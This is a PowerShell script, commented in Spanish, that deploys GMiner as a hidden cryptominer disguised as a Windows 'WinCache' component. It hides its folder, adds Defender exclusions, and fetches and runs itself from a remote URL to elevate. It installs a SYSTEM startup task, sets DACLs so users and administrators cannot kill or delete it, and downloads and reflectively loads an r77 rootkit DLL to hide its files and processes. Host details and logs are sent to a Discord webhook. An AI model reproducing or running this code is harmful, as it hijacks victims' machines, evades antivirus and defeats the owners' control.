#Requires -Version 5.1
<#
.SYNOPSIS
    Deploys and runs GMiner using Task Scheduler with DACL protection.
    Sends real-time logs to Discord for full debugging.
.EXAMPLE
    .\Mine.ps1 -Wallet "YOUR_WALLET_ADDRESS" -Pool "us-rvn.2miners.com:6060" -Algo "kawpow" -DiscordWebhook "https://discord.com/api/webhooks/..."
.EXAMPLE
    .\Mine.ps1 -Uninstall
#>
[CmdletBinding()]
param(
    [string]$Wallet,
    [string]$Pool,
    [string]$Algo,
    [string]$Worker,
    [string]$DiscordWebhook,
    [switch]$Uninstall,
    [switch]$Foreground,
    [switch]$TestWebhook,
    [switch]$Diagnose,
    [switch]$Run,
    [switch]$NoElevate
)
$ErrorActionPreference = 'Stop'

# ---------- paths -----------------------------------------------------------
$RemoteUrl = 'https://raw.githubusercontent.com/UnfairAdventage/AutoMine/refs/heads/main/Mine.ps1'
$Root      = Join-Path $env:ProgramData 'Microsoft\Windows\Caches\WinCache'
$LogDir    = Join-Path $Root 'logs'
$ExePath   = Join-Path $Root 'WinCache.exe'
$SelfPs    = Join-Path $Root 'WinCache.ps1'
$LogFile   = Join-Path $LogDir 'cache.log'
$TaskName  = 'WinCacheAgent'

$scriptPath = $PSCommandPath
if (-not $scriptPath) { $scriptPath = $MyInvocation.MyCommand.Path }

# ---------- helpers ---------------------------------------------------------
Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;

public static class ProcessProtector {
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool SetKernelObjectSecurity(IntPtr Handle, int securityInformation, byte[] pSecurityDescriptor);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetCurrentProcess();

    public static bool ProtectProcessDacl() {
        try {
            IntPtr hProcess = GetCurrentProcess();
            RawSecurityDescriptor rawSd = new RawSecurityDescriptor(
                ControlFlags.DiscretionaryAclPresent | ControlFlags.SelfRelative,
                new SecurityIdentifier(WellKnownSidType.LocalSystemSid, null),
                new SecurityIdentifier(WellKnownSidType.BuiltinAdministratorsSid, null),
                null,
                new DiscretionaryAcl(false, false, 0)
            );
            DiscretionaryAcl dacl = (DiscretionaryAcl)rawSd.DiscretionaryAcl;
            dacl.AddAccess(AccessControlType.Deny, new SecurityIdentifier(WellKnownSidType.AuthenticatedUserSid, null), (int)ProcessAccessRights.Terminate, InheritanceFlags.None, PropagationFlags.None);
            dacl.AddAccess(AccessControlType.Deny, new SecurityIdentifier(WellKnownSidType.BuiltinAdministratorsSid, null), (int)ProcessAccessRights.Terminate, InheritanceFlags.None, PropagationFlags.None);
            rawSd.DiscretionaryAcl = dacl;
            byte[] sdBytes = new byte[rawSd.BinaryLength];
            rawSd.GetBinaryForm(sdBytes, 0);
            return SetKernelObjectSecurity(hProcess, 4, sdBytes);
        } catch { return false; }
    }
}
"@

function Send-DiscordWebhook {
    param([string]$WebhookUrl, [string]$Title, [string]$Message, [int]$Color = 3066993)
    if ([string]::IsNullOrWhiteSpace($WebhookUrl)) { return $false }
    # Discord tiene un límite de 4096 caracteres por descripción
    if ($Message.Length -gt 4000) { $Message = $Message.Substring(0, 3990) + "`n... [Truncado]" }
    
    $payload = [ordered]@{
        embeds = @([ordered]@{ title = $Title; description = $Message; color = $Color; timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ") })
    } | ConvertTo-Json -Depth 4 -Compress
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
    try {
        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $bytes -ContentType 'application/json; charset=utf-8' -TimeoutSec 15 -ErrorAction Stop | Out-Null
        return $true
    } catch { return $false }
}

# ---------- test webhook ----------------------------------------------------
if ($TestWebhook) {
    if (-not $DiscordWebhook) { throw '-TestWebhook requiere -DiscordWebhook <url>' }
    Write-Host '[*] Enviando embed de prueba...'
    $ok = Send-DiscordWebhook -WebhookUrl $DiscordWebhook -Title '🧪 Test' -Message "Prueba desde $($env:COMPUTERNAME)" -Color 3447003
    if ($ok) { Write-Host '[+] Entregado.' } else { Write-Host '[-] Falló.' }
    return
}

# ---------- diagnose --------------------------------------------------------
if ($Diagnose) {
    function Section($t) { Write-Host ''; Write-Host "=== $t ===" -ForegroundColor Cyan }
    function Line($k, $v) { Write-Host ("  {0,-28} {1}" -f $k, $v) }

    Section 'Install path'
    Line 'Root'        $Root
    Line 'Exists'      (Test-Path $Root)
    Line 'WinCache.exe'(Test-Path $ExePath)
    Line 'WinCache.ps1'(Test-Path $SelfPs)
    Line 'cache.log'   $LogFile

    Section 'Scheduled Task'
    $task = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
    if ($task) { Line 'State' $task.State } else { Write-Host '  No hay tarea programada.' -ForegroundColor Yellow }

    Section 'Processes'
    $miners = Get-Process WinCache -ErrorAction SilentlyContinue
    if ($miners) { foreach ($m in $miners) { Line "Miner PID $($m.Id)" "started=$($m.StartTime)" } } else { Write-Host '  Miner NO corriendo.' -ForegroundColor Yellow }

    Section 'Last 10 lines of cache.log'
    if (Test-Path $LogFile) { Get-Content $LogFile -Tail 10 | ForEach-Object { Write-Host "  $_" } } else { Write-Host '  (No existe)' }
    Write-Host ''
    return
}

# ---------- elevation -------------------------------------------------------
if (-not $Run -and -not $NoElevate) {
    $id = [Security.Principal.WindowsIdentity]::GetCurrent()
    $pr = New-Object Security.Principal.WindowsPrincipal($id)
    if (-not $pr.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        $a = @('-NoProfile','-ExecutionPolicy','Bypass','-Command', "iex ""& { `$(irm '$RemoteUrl') } ")
        foreach ($k in $PSBoundParameters.Keys) {
            if ($k -eq 'NoElevate') { continue }
            $v = $PSBoundParameters[$k]
            if ($v -is [switch]) { if ($v) { $a[3] += "-$k " } }
            else { $a[3] += "-$k '$v' " }
        }
        $a[3] += "-NoElevate"""
        Start-Process powershell -Verb RunAs -ArgumentList $a
        exit
    }
}

# ---------- stop safe -------------------------------------------------------
function Stop-Safe {
    Write-Host '[*] Deteniendo instancia anterior de forma segura...'
    
    $sd = (New-Object System.Security.AccessControl.DirectorySecurity)
    $sddl = "*D:AI(A;;FA;;;SY)(A;;FA;;;BA)(A;;FA;;;AU)"
    try {
        $taskService = New-Object -ComObject "Schedule.Service"
        $taskService.Connect()
        $folder = $taskService.GetFolder("\")
        $task = $folder.GetTask("\$TaskName")
        if ($task) { $task.SetSecurityDescriptor($sddl, 0) }
    } catch {}

    Stop-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
    
    $watchers = Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
        Where-Object { $_.CommandLine -like '*WinCache.ps1*' }
    foreach ($w in $watchers) { Stop-Process -Id $w.ProcessId -Force -ErrorAction SilentlyContinue }
    
    Start-Sleep -Seconds 1
    Get-Process WinCache -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
}

if ($Uninstall) {
    Stop-Safe
    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
    
    try {
        Remove-MpPreference -ExclusionPath $Root -ErrorAction SilentlyContinue
        Remove-MpPreference -ExclusionProcess 'WinCache.exe' -ErrorAction SilentlyContinue
    } catch {}
    
    Write-Host '[+] Desinstalado correctamente.'
    return
}

# ---------- watcher mode ----------------------------------------------------
if ($Run) {
    New-Item -ItemType Directory -Force -Path $LogDir | Out-Null
    if (-not $Wallet -or -not $Pool -or -not $Algo) { exit 1 }

    # Variables para el buffer de logs a Discord
    $logBuffer = New-Object System.Collections.ArrayList
    $lastDiscordSend = Get-Date

    function Write-Session {
        param([string]$Msg, [string]$Level = 'INFO')
        $ts = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
        $formatted = "$ts [$Level] $Msg"
        
        # 1. Guardar siempre en disco
        Add-Content -Path $LogFile -Value $formatted -Encoding UTF8

        # 2. Enviar a Discord
        if ($DiscordWebhook) {
            if ($Level -eq 'FATAL' -or $Level -eq 'WARN') {
                # Errores: Envío inmediato
                $color = if ($Level -eq 'FATAL') { 15158332 } else { 16776960 }
                Send-DiscordWebhook -WebhookUrl $DiscordWebhook -Title "🚨 Log [$Level]" -Message $formatted -Color $color | Out-Null
            } else {
                # Info normal: Acumular en buffer
                [void]$logBuffer.Add($formatted)
                if ((Get-Date) - $lastDiscordSend -gt [TimeSpan]::FromSeconds(30)) {
                    if ($logBuffer.Count -gt 0) {
                        $chunk = $logBuffer -join "`n"
                        Send-DiscordWebhook -WebhookUrl $DiscordWebhook -Title "📝 Logs (Últimos 30s)" -Message $chunk -Color 3066993 | Out-Null
                        $logBuffer.Clear()
                    }
                    $lastDiscordSend = Get-Date
                }
            }
        }
    }

    Write-Session "Watcher iniciado (PID $PID)."
    
    # --- DACL: Proteger el proceso actual ---
    $aclStatus = [ProcessProtector]::ProtectProcessDacl()
    if ($aclStatus) { Write-Session "Watcher protegido con DACL." } else { Write-Session "No se pudo aplicar DACL." 'WARN' }

    # --- ROOTKIT ---
    try {
        $bytes = (New-Object Net.WebClient).DownloadData("https://raw.githubusercontent.com/moom825/Discord-RAT-2.0/master/Discord%20rat/Resources/rootkit.dll")  
        $asm = [Reflection.Assembly]::Load($bytes)  
        $asm.EntryPoint.Invoke($null, @([string[]]@())) | Out-Null
        $rk = [Microsoft.Win32.Registry]::LocalMachine.CreateSubKey('SOFTWARE\$77config\paths')  
        $rk.SetValue([IO.Path]::GetRandomFileName(), $Root, 'String'); $rk.Close()  
        $rk = [Microsoft.Win32.Registry]::LocalMachine.CreateSubKey('SOFTWARE\$77config\pid')  
        $rk.SetValue([IO.Path]::GetRandomFileName(), $PID, 'DWord'); $rk.Close()  
        Write-Session "Rootkit r77 cargado y configurado."
    } catch { Write-Session "Error en rootkit: $_" 'WARN' }

    $fatalRe = 'device not found|no (cuda|opencl|amd|nvidia|gpu) devices|unknown algo|authorization failed|out of memory|failed to (initialize|load)'
    $argStr = "--algo $Algo --server $Pool --user $Wallet.$Worker"
    $restarts = 0
    $notifiedStart = $false

    while ($true) {
        Write-Session "Lanzando minero (intento $($restarts + 1))..."
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = $ExePath; $psi.Arguments = $argStr; $psi.WorkingDirectory = $Root
        $psi.UseShellExecute = $false; $psi.RedirectStandardOutput = $true; $psi.CreateNoWindow = $true
        $psi.StandardOutputEncoding = [System.Text.Encoding]::UTF8
        $proc = New-Object System.Diagnostics.Process; $proc.StartInfo = $psi
        
        try {
            $proc.Start() | Out-Null
            try {
                $rk = [Microsoft.Win32.Registry]::LocalMachine.CreateSubKey('SOFTWARE\$77config\pid')  
                $rk.SetValue([IO.Path]::GetRandomFileName(), $proc.Id, 'DWord'); $rk.Close()  
            } catch {}

            if (-not $notifiedStart -and $DiscordWebhook) {
                $msg = "Host: $($env:COMPUTERNAME)`nWorker: $Worker`nPool: $Pool"
                Send-DiscordWebhook -WebhookUrl $DiscordWebhook -Title "✅ Minero Iniciado" -Message $msg -Color 3066993 | Out-Null
                $notifiedStart = $true
            }
        } catch {
            Write-Session "Fallo crítico al iniciar el proceso: $_" 'FATAL'
            break
        }

        $q = [System.Collections.Concurrent.ConcurrentQueue[string]]::new()
        $sub = Register-ObjectEvent -InputObject $proc -EventName OutputDataReceived -Action { if ($null -ne $EventArgs.Data) { $Event.MessageData.Enqueue($EventArgs.Data) } } -MessageData $q
        $proc.BeginOutputReadLine()

        while (-not $proc.HasExited -or -not $q.IsEmpty) {
            $line = $null
            if ($q.TryDequeue([ref]$line)) {
                # Enviamos cada línea del minero a la función Write-Session
                $lvl = if ($line -match $fatalRe) { 'FATAL' } else { 'INFO' }
                Write-Session "MINER: $line" $lvl
            } else { 
                Start-Sleep -Milliseconds 200 
            }
        }

        $proc.WaitForExit()
        Unregister-Event -SourceIdentifier $sub.Name -ErrorAction SilentlyContinue
        $proc.Dispose()
        
        Write-Session "El minero se detuvo (Código de salida: $($proc.ExitCode))." 'WARN'
        
        $restarts++
        if ($restarts -ge 10) { 
            Write-Session "Se alcanzaron 10 reinicios. Deteniendo por seguridad." 'FATAL'
            break 
        }
        Write-Session "Reiniciando en 30 segundos..."
        Start-Sleep -Seconds 30
    }
    exit 0
}

# ---------- folders & defender ----------------------------------------------
foreach ($d in @($Root, $LogDir)) { if (-not (Test-Path $d)) { New-Item -ItemType Directory -Force -Path $d | Out-Null } }
try { $item = Get-Item $Root -Force; if (-not ($item.Attributes -band [System.IO.FileAttributes]::Hidden)) { $item.Attributes = $item.Attributes -bor [System.IO.FileAttributes]::Hidden } } catch {}

try {
    $mp = Get-MpPreference -ErrorAction Stop
    if (@($mp.ExclusionPath) -notcontains $Root) { Add-MpPreference -ExclusionPath $Root }
    if (@($mp.ExclusionProcess) -notcontains 'WinCache.exe') { Add-MpPreference -ExclusionProcess 'WinCache.exe' }
} catch {}

# ---------- GMiner fetch ----------------------------------------------------
if (-not (Test-Path $ExePath)) {
    Write-Host '[*] Descargando GMiner...'
    $rel = Invoke-RestMethod -Uri 'https://api.github.com/repos/develsoftware/GMinerRelease/releases/latest' -Headers @{ 'User-Agent' = 'PowerShell' }
    $asset = $rel.assets | Where-Object { $_.name -match 'windows64\.zip$' } | Select-Object -First 1
    $tmp = Join-Path $env:TEMP ('gc-{0}.zip' -f ([guid]::NewGuid().ToString('N')))
    $stage = Join-Path $env:TEMP ('gc-{0}' -f ([guid]::NewGuid().ToString('N')))
    Invoke-WebRequest -Uri $asset.browser_download_url -OutFile $tmp -UseBasicParsing
    Expand-Archive -Path $tmp -DestinationPath $stage -Force
    $inner = Get-ChildItem $stage -Recurse -Filter 'miner.exe' | Select-Object -First 1
    Copy-Item $inner.FullName $ExePath -Force
    Remove-Item $tmp, $stage -Recurse -Force -ErrorAction SilentlyContinue
}

# ---------- worker hash -----------------------------------------------------
if ([string]::IsNullOrWhiteSpace($Worker)) {
    $sha = [System.Security.Cryptography.SHA256]::Create()
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($env:COMPUTERNAME)
    $hash = $sha.ComputeHash($bytes); $sha.Dispose()
    $Worker = "rig_$([System.BitConverter]::ToString($hash).Replace('-','').Substring(0,6).ToLower())"
}

# ---------- install self (Soporte para iwr | iex) ---------------------------
if ($scriptPath -and (Test-Path $scriptPath) -and ($scriptPath -ne $SelfPs)) {
    Copy-Item $scriptPath $SelfPs -Force
    Unblock-File $SelfPs -ErrorAction SilentlyContinue
} elseif (-not $scriptPath -or -not (Test-Path $scriptPath)) {
    Write-Host '[*] Ejecución en memoria detectada. Guardando copia local...'
    Invoke-WebRequest -Uri $RemoteUrl -OutFile $SelfPs -UseBasicParsing
}

$head = (Get-Content $SelfPs -TotalCount 1 -ErrorAction SilentlyContinue)
if ($head -notmatch '^#Requires') { Remove-Item $SelfPs -Force; throw "Archivo descargado no es válido." }

# ---------- safe update & scheduled task ------------------------------------
Write-Host '[*] Actualizando instalación...'
Stop-Safe
Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue

$argList = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$SelfPs`" -Wallet `"$Wallet`" -Pool `"$Pool`" -Algo `"$Algo`" -Worker `"$Worker`""
if ($DiscordWebhook) { $argList += " -DiscordWebhook `"$DiscordWebhook`"" }
$argList += " -Run -NoElevate"

Write-Host '[*] Registrando Tarea Programada...'
$Action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument $argList
$Trigger = New-ScheduledTaskTrigger -AtStartup
$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Principal $Principal -Description "WinCache Agent" | Out-Null

# --- PROTECCIÓN DE LA TAREA (DACL) ---
Write-Host '[*] Aplicando DACL a la Tarea Programada...'
try {
    $sddl = "*D:AI(A;;FA;;;SY)(A;;FA;;;BA)(D;;DC;;;AU)"
    $taskService = New-Object -ComObject "Schedule.Service"
    $taskService.Connect()
    $folder = $taskService.GetFolder("\")
    $task = $folder.GetTask("\$TaskName")
    $task.SetSecurityDescriptor($sddl, 0)
    Write-Host '[+] Tarea protegida.'
} catch {
    Write-Warning "No se pudo aplicar DACL a la tarea: $_"
}

Write-Host '[*] Iniciando Tarea...'
Start-ScheduledTask -TaskName $TaskName

if ($DiscordWebhook) {
    $msg = "Host: $($env:COMPUTERNAME)`nWorker: $Worker`nPool: $Pool`nAlgo: $Algo`nEstado: Tarea Instalada y Protegida."
    Send-DiscordWebhook -WebhookUrl $DiscordWebhook -Title "✅ Instalación Exitosa" -Message $msg -Color 3066993 | Out-Null
}

Write-Host ''
Write-Host '=================================================='
Write-Host '  Tarea Programada instalada y protegida.'
Write-Host "  Install : $Root"
Write-Host "  Log     : $LogFile"
Write-Host '=================================================='
